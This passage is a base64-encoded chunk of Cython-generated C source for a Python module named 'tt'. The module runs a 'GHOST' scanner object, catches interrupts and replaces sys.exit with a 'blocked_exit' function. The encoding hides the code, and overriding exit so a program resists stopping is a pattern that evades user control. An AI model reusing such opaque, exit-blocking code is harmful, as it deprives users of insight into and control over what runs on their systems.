EVYID49IDB4MDMwRTAwMDBcbiAgUHlVbnN0YWJsZV9PYmplY3RfRW5hYmxlRGVmZXJyZWRSZWZjb3VudChfX3B5eF90XzgpO1xuICAjZW5kaWZcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HSE9TVCwgX19weXhfdF84KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25hbWVfMik7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ3MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzkgPSAoX19QeXhfUHlVbmljb2RlX0VxdWFscyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tYWluLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOSA8IDApKSkgX19QWVhfRVJSKDAsIDQ3MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBpZiAoX19weXhfdF85KSB7XG5cbiAgICBcbiAgICB7XG4gICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzEwLCAmX19weXhfdF8xMSk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfOCA9IE5VTEw7XG4gICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NzUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgX19weXhfdF83ID0gMTtcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzgsIE5VTEx9O1xuICAgICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgxLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NzUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgICB9XG4gICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2Nhbm5lciwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ3NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzUgPSBOVUxMO1xuICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NjYW5uZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0NzYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ydW4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NzYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fcHl4X3RfNyA9IDE7XG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTtcbiAgICAgICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMS1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDc2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICAgICAgICBcbiAgICAgIH1cbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7XG4gICAgICBfX3B5eF9MM19lcnJvcjo7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfS2V5Ym9hcmRJbnRlcnJ1cHQpKSkpO1xuICAgICAgaWYgKF9fcHl4X3RfMTIpIHtcbiAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzIsICZfX3B5eF90XzQsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDQ3NywgX19weXhfTDVfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzYgPSBOVUxMO1xuICAgICAgICBfX3B5eF90XzcgPSAxO1xuICAgICAgICB7XG4gICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99O1xuICAgICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfYnVpbHRpbl9wcmludCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDc4LCBfX3B5eF9MNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTtcbiAgICAgIGlmIChfX3B5eF90XzEyKSB7XG4gICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidHQiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF81LCAmX19weXhfdF80LCAmX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCA0NzksIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lLCBfX3B5eF90XzQpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDc5LCBfX3B5eF9MNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzYgPSBOVUxMO1xuICAgICAgICAgIF9fcHl4X3RfNyA9IDE7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99O1xuICAgICAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF9idWlsdGluX3ByaW50LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDgwLCBfX3B5eF9MMTZfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIH1cblxuICAgICAgICBcbiAgICAgICAgIHtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlPYmplY3RfRGVsQXR0clN0cihfX3B5eF9tLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZSkgPCAwKSkgeyBpZiAobGlrZWx5KFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSkgUHlFcnJfQ2xlYXIoKTsgZWxzZSBfX1BZWF9FUlIoMCwgNDc5LCBfX3B5eF9MNV9leGNlcHRfZXJyb3IpIH1cbiAgICAgICAgICAgIGdvdG8gX19weXhfTDE3O1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF9MMTZfZXJyb3I6O1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgICAgIF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE2ID0gMDsgX19weXhfdF8xNyA9IDA7IF9fcHl4X3RfMTggPSAwOyBfX3B5eF90XzE5ID0gMDsgX19weXhfdF8yMCA9IDA7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8xOCwgJl9fcHl4X3RfMTksICZfX3B5eF90XzIwKTtcbiAgICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzE1LCAmX19weXhfdF8xNiwgJl9fcHl4X3RfMTcpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzE1LCAmX19weXhfdF8xNiwgJl9fcHl4X3RfMTcpO1xuICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTcpO1xuICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjApO1xuICAgICAgICAgICAgX19weXhfdF8xMiA9IF9fcHl4X2xpbmVubzsgX19weXhfdF8xMyA9IF9fcHl4X2NsaW5lbm87IF9fcHl4X3RfMTQgPSBfX3B5eF9maWxlbmFtZTtcbiAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5T2JqZWN0X0RlbEF0dHJTdHIoX19weXhfbSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2UpIDwgMCkpIHsgaWYgKGxpa2VseShQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkpIFB5RXJyX0NsZWFyKCk7IGVsc2UgX19QWVhfRVJSKDAsIDQ3OSwgX19weXhfTDIxX2Vycm9yKSB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTkpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yMCk7XG4gICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE4LCBfX3B5eF90XzE5LCBfX3B5eF90XzIwKTtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8xNSwgX19weXhfdF8xNiwgX19weXhfdF8xNyk7XG4gICAgICAgICAgICBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTcgPSAwOyBfX3B5eF90XzE4ID0gMDsgX19weXhfdF8xOSA9IDA7IF9fcHl4X3RfMjAgPSAwO1xuICAgICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8xMjsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMTM7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8xNDtcbiAgICAgICAgICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuICAgICAgICAgICAgX19weXhfTDIxX2Vycm9yOjtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTgpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIwKTtcbiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTgsIF9fcHl4X3RfMTksIF9fcHl4X3RfMjApO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgICAgICAgX19weXhfdF8xOCA9IDA7IF9fcHl4X3RfMTkgPSAwOyBfX3B5eF90XzIwID0gMDtcbiAgICAgICAgICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF9MMTc6O1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICB9XG4gICAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjtcblxuICAgICAgXG4gICAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6O1xuICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMTAsIF9fcHl4X3RfMTEpO1xuICAgICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzEwLCBfX3B5eF90XzExKTtcbiAgICAgIF9fcHl4X0w4X3RyeV9lbmQ6O1xuICAgIH1cblxuICAgIFxuICB9XG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDgzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZXhpdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDgzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29yaWdpbmFsX2V4aXQsIF9fcHl4X3RfNCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0ODMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcblxuICBcbiAgX19weXhfdF80ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnR0XzFibG9ja2VkX2V4aXQsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ibG9ja2VkX2V4aXQsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzIwXSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0ODYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoX19weXhfdF80KTtcbiAgI2VuZGlmXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxvY2tlZF9leGl0LCBfX3B5eF90XzQpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDg2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxvY2tlZF9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDkxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDkxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXRfMywgX19weXhfdF80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ5MSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGVzdCwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcblxuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpO1xuICBpZiAoX19weXhfbSkge1xuICAgIGlmIChfX3B5eF9tc3RhdGUtPl9fcHl4X2QgJiYgc3RyaW5ndGFiX2luaXRpYWxpemVkKSB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImluaXQgdHQiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICB9XG4gICAgI2lmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgIFB5X0NMRUFSKF9fcHl4X20pO1xuICAgICNlbHNlXG4gICAgUHlfREVDUkVGKF9fcHl4X20pO1xuICAgIGlmIChweXN0YXRlX2FkZG1vZHVsZV9ydW4pIHtcbiAgICAgIFB5T2JqZWN0ICp0cCwgKnZhbHVlLCAqdGI7XG4gICAgICBQeUVycl9GZXRjaCgmdHAsICZ2YWx1ZSwgJnRiKTtcbiAgICAgIFB5U3RhdGVfUmVtb3ZlTW9kdWxlKCZfX3B5eF9tb2R1bGVkZWYpO1xuICAgICAgUHlFcnJfUmVzdG9yZSh0cCwgdmFsdWUsIHRiKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gIH0gZWxzZSBpZiAoIVB5RXJyX09jY3VycmVkKCkpIHtcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW1wb3J0RXJyb3IsICJpbml0IHR0Iik7XG4gIH1cbiAgX19weXhfTDA6O1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICByZXR1cm4gKF9fcHl4X20gIT0gTlVMTCkgPyAwIDogLTE7XG4gICNlbHNlXG4gIHJldHVybiBfX3B5eF9tO1xuICAjZW5kaWZcbn1cblxuXG5cbnN0YXRpYyBpbnQgX19QeXhfSW5pdENhY2hlZEJ1aW